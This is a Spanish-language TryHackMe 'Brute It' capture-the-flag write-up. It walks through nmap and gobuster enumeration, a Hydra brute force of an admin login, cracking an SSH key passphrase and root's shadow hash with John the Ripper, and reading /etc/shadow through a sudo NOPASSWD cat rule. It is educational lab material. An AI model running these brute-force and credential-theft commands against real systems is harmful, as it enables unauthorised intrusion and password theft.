# 🔐 Brute It - TryHackMe CTF Writeup

## 📋 Introducción

En este writeup aprenderemos sobre:
- 💥 **Fuerza bruta**: Técnicas para romper credenciales de acceso
- 🔓 **Descifrado de hash**: Métodos para crackear hashes de contraseñas
- ⬆️ **Escalada de privilegios**: Técnicas para obtener acceso root

---

## 🚀 Paso 1: Verificación de conectividad con Ping

Antes de iniciar, siempre es recomendable comprobar la conectividad con la máquina objetivo. Utilizamos el comando `ping` para asegurarnos de que está **accesible y lista para recibir nuestras peticiones**.

### 👩‍💻 Comando utilizado:
````bash
ping -c 4 10.10.175.159
````
- `-c 4`: Limita el envío a 4 paquetes ICMP.
- `10.10.175.159`: Es la IP de la máquina objetivo asignada por TryHackMe.

### 📊 Salida obtenida:
Como muestra la imagen, todos los paquetes fueron **recibidos correctamente** (0% packet loss), lo que confirma que **podemos alcanzar la máquina** y continuar con el laboratorio.

````bash
PING 10.10.175.159 (10.10.175.159) 56(84) bytes of data.
64 bytes from 10.10.175.159: icmp_seq=1 ttl=63 time=52.4 ms
64 bytes from 10.10.175.159: icmp_seq=2 ttl=63 time=52.9 ms
64 bytes from 10.10.175.159: icmp_seq=3 ttl=63 time=58.4 ms
64 bytes from 10.10.175.159: icmp_seq=4 ttl=63 time=52.1 ms

--- 10.10.175.159 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3009ms
rtt min/avg/max/mdev = 52.126/53.947/58.404/2.586 ms
````

### 🖼️ Captura:

<img width="744" height="308" alt="Ping" src="https://github.com/user-attachments/assets/bd0c2526-cdd3-4300-afd8-42b3dc876579" />

---

## 🔍 Paso 2: Escaneo de puertos con Nmap

Después de verificar la conectividad, el siguiente paso es identificar **puertos abiertos y servicios** activos en la máquina objetivo utilizando Nmap. Este paso es esencial para definir la superficie de ataque y planificar los siguientes movimientos.

### 👩‍💻 Comando utilizado:
````bash
nmap -p- -sV -sC --open --min-rate 5000 -vvv -n -Pn -oN escaneo 10.10.175.159
````

#### 📖 Explicación de parámetros principales:
- `-p-`: Escanea todos los puertos (1-65535)
- `-sV`: Detecta la versión de los servicios encontrados
- `-sC`: Ejecuta scripts de Nmap por defecto
- `--open`: Solo muestra puertos abiertos
- `--min-rate 5000`: Aumenta la velocidad de escaneo (5000 paquetes/seg)
- `-vvv`: Salida muy detallada
- `-n`: No resuelve nombres de host
- `-Pn`: Omite el ping previo (host discovery)
- `-oN escaneo`: Guarda la salida en el archivo `escaneo`

### 📊 Resultados del escaneo:

- **22/tcp (SSH)**: OpenSSH 7.6p1 Ubuntu 4ubuntu0.3
- **80/tcp (HTTP)**: Apache httpd 2.4.29 (Ubuntu), página por defecto de Apache

Esto sugiere posibles vectores de ataque:
- Ataques por fuerza bruta a SSH 🗝️
- Análisis y potencial explotación del servidor web 🕸️

#### 🖼️ Captura:

<img width="1847" height="662" alt="nmap" src="https://github.com/user-attachments/assets/57747627-9ed9-48ba-a1e8-23ba0f29da03" />

Con estos datos, ya sabemos que hay dos servicios significativos abiertos para seguir con el laboratorio.

---

## 🧭 Paso 3: Enumeración de directorios con Gobuster

Una vez identificado el servicio HTTP en el puerto 80, el siguiente paso es enumerar **directorios y archivos ocultos** del servidor web. Para ello utilizamos la herramienta `gobuster`, que realiza un ataque de fuerza bruta sobre rutas utilizando un diccionario.

### 👩‍💻 Comando utilizado

En mi caso ejecuté Gobuster y guardé los resultados en un archivo de texto llamado `resultadosdir.txt`, que luego inspeccioné con `cat`:
````bash
cat resultadosdir.txt
````

### 📊 Resultados relevantes

En la salida se observan múltiples rutas con estado **403 (Forbidden)**, lo que indica que existen pero el servidor restringe el acceso directo:

- `/.php` (Status: 403)
- `/.hta` (Status: 403)
- `/server-status` (Status: 403)
- etc.

Lo interesante aparece al final del listado:

- `/admin` (Status: 301) ➜ Redirección a `http://10.10.175.159/admin/`
- `/index.html` (Status: 200)

La ruta `/admin` es especialmente importante 🧩, ya que suele corresponder a un **panel de administración** que podrá ser objetivo de futuros ataques de fuerza bruta o intentos de acceso.

### 🖼️ Captura

<img width="1416" height="623" alt="gobuster" src="https://github.com/user-attachments/assets/ba293afb-8f0d-4c1b-aa1c-ac1029e97b77" />

Gracias a este paso ya sabemos que existe un posible panel de administración en `/admin`, que utilizaremos más adelante en el proceso de explotación.

---

## 🛠️ Paso 4: Descubrimiento del panel admin y análisis del código fuente

Tras descubrir la ruta `/admin` con Gobuster, accedí vía navegador y observé el panel de **login de administración**. Es una buena práctica revisar el código fuente de la página para buscar información o pistas ocultas.

### 🕵️‍♂️ Inspección visual del panel

La página /admin presenta un formulario básico solicitando **USERNAME** y **PASSWORD**.

<img width="1225" height="950" alt="pagina admin" src="https://github.com/user-attachments/assets/37188577-0f68-4ec1-bc93-18f9cf5ef8a2" />

### 🔍 Revisión del código fuente

Al examinar el código fuente con `Ctrl+U`, encontré un comentario muy revelador:
```text
<!-- Hey john, if you do not remember, the username is admin -->
````

Este **comentario oculto** sugiere que el nombre de usuario es `admin`, lo que nos facilita posteriores ataques de fuerza bruta para obtener la contraseña.

<img width="808" height="625" alt="codigo fuente admin" src="https://github.com/user-attachments/assets/d95b3103-518a-4e17-94c9-ccba3b6b1c6d" />

### 🎯 Conclusión del paso

- **Vector de ataque identificado:** Ataque de fuerza bruta sobre el formulario usando `admin` como nombre de usuario.
- La seguridad por “ocultamiento” no es efectiva: los **comentarios en código fuente pueden revelar información sensible**.

---

---

## 🔓 Paso 5: Ataque de fuerza bruta con Hydra y acceso al panel admin

Sabiendo que el usuario es `admin`, realizamos un ataque de fuerza bruta para la contraseña usando la herramienta **Hydra** y el archivo de diccionario `rockyou.txt`.

### 👩‍💻 Comando utilizado
````bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.175.159 http-post-form "/admin/:user=^USER^&pass=^PASS^:F=Username or password invalid" -V
````
- `-l admin`: Usuario objetivo.
- `-P /usr/share/wordlists/rockyou.txt`: Diccionario de contraseñas.
- `http-post-form`: Ataque al formulario POST de la página `/admin`.
- `F=Username or password invalid`: Cadena de error que indica fallo en el login.
- `-V`: Modo verbose.

### 📝 Resultado de Hydra

En la salida, Hydra muestra varios intentos y finalmente **encuentra la contraseña válida**, permitiendo el acceso al panel para el usuario `admin`:

<img width="869" height="496" alt="pasamos hydra" src="https://github.com/user-attachments/assets/c3b63322-a90d-44d5-8a6d-3532b70943c8" />

### ✅ Acceso al panel y bandera web

Tras introducir el usuario y contraseña encontrados, accedimos al **panel de administración** en `/admin/panel`.  
En la página encontramos:
- **Flag web**
- Un enlace para descargar la **clave privada RSA** para el usuario john

Esto sugiere una probable escalada de privilegios por SSH más adelante usando dicha clave.

<img width="1484" height="254" alt="accedemos al panel y obtenemos flag web y acceso a rsa key" src="https://github.com/user-attachments/assets/c111d81e-70be-4e69-8677-8ba971729426" />

### 🎯 Resumen del paso

- Ataque de fuerza bruta ✅  
- Acceso exitoso al panel admin y obtención de credenciales relevantes 🏆

---

## 🔑 Paso 6: Obtención de la clave RSA y recuperación del passphrase

Luego de acceder al panel de administración, descargué la **clave privada RSA** que podría permitir acceso SSH como el usuario `john`. Sin embargo, la clave está **protegida con passphrase**, así que necesitamos descifrarla.

### 👩‍💻 Descarga de la clave RSA

Utilicé el comando `wget` para descargar el archivo directamente desde el panel:
````bash
wget http://10.10.175.159/admin/panel/id_rsa
````

<img width="771" height="621" alt="RSa key" src="https://github.com/user-attachments/assets/b9502c1d-f856-4c31-98bf-e5d18dd12cb0" />

### 📚 Conversión de la clave para John the Ripper

John the Ripper necesita la clave en formato crackeable. Para ello se utiliza el script `ssh2john.py`:
```bash
/usr/share/john/ssh2john.py id_rsa > idrsa.txt
````

### 🥊 Crackeo del passphrase con John the Ripper

Se lanza el ataque de fuerza bruta con el diccionario `rockyou.txt`:
````bash
john idrsa.txt --wordlist=/usr/share/wordlists/rockyou.txt
````

El proceso es exitoso y muestra el **passphrase** necesario para desbloquear la clave. Resultado (ejemplo):
````bash
rock44 (id_rsa)
````

<img width="871" height="651" alt="con la Rsakey obtengo el passaphrase" src="https://github.com/user-attachments/assets/1c738a55-e3bc-414d-956c-f0a471c49360" />

---

## 👤 Paso 7: Acceso al usuario y obtención de la flag user

Ahora que contamos con la clave privada y el passphrase, nos conectamos a la máquina como **usuario john** usando SSH y verificamos la presencia de la **flag de usuario**.

### 👩‍💻 Comando utilizado para conexión SSH

Primero damos los permisos adecuados a la clave:
```bash
chmod 600 id_rsa
````
Luego conectamos vía SSH:
````bash
ssh john@10.10.175.159 -i id_rsa
````
Se nos solicita el passphrase obtenido previamente; al ingresarlo, accedemos exitosamente a la shell del usuario john.

<img width="830" height="546" alt="ontenemos acceso al usuario" src="https://github.com/user-attachments/assets/c535e20b-6ba0-42d8-88e1-fbd953b10730" />

### 🏁 Obtención de la flag user

En el home del usuario encontramos el archivo `user.txt`. Usamos el comando:
````bash
cat user.txt
````
para visualizar la bandera y poder enviarla como prueba de acceso conseguido.

<img width="652" height="141" alt="flag user" src="https://github.com/user-attachments/assets/594e9df7-0b04-4d8e-ac1d-f6e62a7343a1" />

---

**Resumen del paso:**
- Acceso SSH exitoso como usuario john 🔓
- Flag user obtenida y validada ✅

---

## ⬆️ Paso 8: Escalada de privilegios y lectura del archivo `/etc/shadow`

Con acceso SSH como el usuario `john`, pasamos a buscar vectores de **escalada de privilegios** para lograr acceso root o leer archivos protegidos.

### 🔍 Enumeración de privilegios sudo

Al ejecutar `sudo -l`, observamos que el usuario `john` puede ejecutar **/bin/cat** como root SIN contraseña:
````bash
(root) NOPASSWD: /bin/cat
````

Esto significa que `john` puede leer **cualquier archivo** en el sistema, incluyendo los protegidos como root.

<img width="984" height="796" alt="miramos permisos y binario" src="https://github.com/user-attachments/assets/9f305f25-cc99-4fa8-8797-facb539ae74d" />

---

### 📚 Apoyo con GTFOBins

Consultando la documentación de **GTFOBins**, revisamos cómo aprovechar `cat` (y otros binarios) para leer archivos restringidos a root usando variables de entorno.

---

### 🗝️ Lectura del archivo `/etc/shadow`

Definimos la variable `LFILE` para apuntar al archivo protegido y lo leemos usando sudo y cat:
````bash
LFILE=/etc/shadow
sudo cat "$LFILE"
````

Esto nos permite obtener **todos los hashes de contraseñas de los usuarios del sistema**, incluyendo `root`.  
Parte de la salida:
````bash
root:$6$zdk0.jUm$Yva24cGzM1duJkwM5b1...
````

<img width="891" height="717" alt="utilizando el comando de gtofins leo el archivo shadows y obtendo una lista de usuarios y hashes" src="https://github.com/user-attachments/assets/27e87c76-cec3-4d99-83c6-b175326e8d98" />

---

**Resumen del paso:**  
- Localizamos un binario (`cat`) con privilegios de root en sudo SIN contraseña.
- Usamos ese acceso para leer el contenido de `/etc/shadow`, obteniendo los **hashes** para un posible ataque de fuerza bruta a la contraseña root.

---

## 👑 Paso 9: Crackeo de hash root y obtención de la flag root

Después de obtener los hashes del archivo `/etc/shadow`, creamos un archivo con estos hashes para intentar descifrar la contraseña de root.

### 👩‍💻 Creación del archivo y crackeo con John the Ripper

Se guarda en un archivo llamado `hashes` el contenido con los hashes recopilados. Luego ejecutamos:
````bash
john hashes --wordlist=/usr/share/wordlists/rockyou.txt
````

John procesa los hashes y finalmente encuentra la contraseña correspondiente al usuario `root`.

<img width="923" height="212" alt="me creo un archivo con los hashes y paso john onbtenieudo clave root" src="https://github.com/user-attachments/assets/8fd8b315-bae1-42f6-a524-fca0049ba6a2" />

---

### 🔐 Acceso final a root y visualización de la flag

Con la contraseña root descubierta, usamos:
````bash
su root
````

Para cambiar al usuario root.

Con privilegios root confirmados (`uid=0(root)`), mostramos la flag final:
````bash
cat /root/root.txt
````

<img width="482" height="233" alt="obtengo flag root" src="https://github.com/user-attachments/assets/a9000b26-b1cf-4501-b252-c3e381aedcb7" />

---

### 🎯 Resumen final

- Crackeamos con éxito la contraseña root a partir de los hashes obtenidos.
- Accedimos a la cuenta root y leímos la flag final.
- Finalizamos el laboratorio con escalada completa de privilegios y captura de todas las flags.

---

¡Felicidades por completar el CTF "Brute It"!  
Este writeup cubrió:

- Fuerza bruta  
- Análisis y crackeo de hashes  
- Escalada de privilegios con sudo y binarios legítimos






























